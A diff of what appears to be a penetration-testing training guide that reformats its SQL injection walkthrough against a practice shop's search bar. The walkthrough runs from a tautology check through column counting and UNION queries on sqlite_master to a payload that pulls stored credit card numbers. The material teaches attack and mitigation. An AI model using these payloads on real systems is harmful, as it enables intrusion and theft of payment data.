@@ -110,19 +110,29 @@ We move on to A02:2021 – Cryptographic Failures. While demonstrated via an SQL
 
 In our application, the product search bar queries the database. As penetration testers, we can exploit this to extract credit cards. I encourage you to formulate the payload to obtain this information before reading the solution. 
 
-```bash' OR '1'='1 ```
+```bash
+' OR '1'='1
+```
 => Confirms the vulnerability. 
 
-```bash ' ORDER BY N-- ```
+```bash 
+' ORDER BY N--
+```
 => Increment N until the application crashes to determine the column count needed for a UNION query. 
 
-```bash ' UNION SELECT name, type, 0, sql, null, null FROM sqlite_master WHERE type='table' -- ```
+```bash 
+' UNION SELECT name, type, 0, sql, null, null FROM sqlite_master WHERE type='table' --
+```
 => Lists all tables. 
 
-```bash ' UNION SELECT type, name, 0, sql, null, null FROM sqlite_master WHERE type='table' -- ```
+```bash
+' UNION SELECT type, name, 0, sql, null, null FROM sqlite_master WHERE type='table' -- 
+```
 => Lists table columns. 
 
-```bash ' UNION SELECT 0, card_number_secure, 0, 0, 0, 0 FROM users_creditcard -- ```
+```bash 
+' UNION SELECT 0, card_number_secure, 0, 0, 0, 0 FROM users_creditcard --
+```
 => Extracts the plain-text card number. (Replace the column name to extract other data).
 
 **How to mitigate it:**
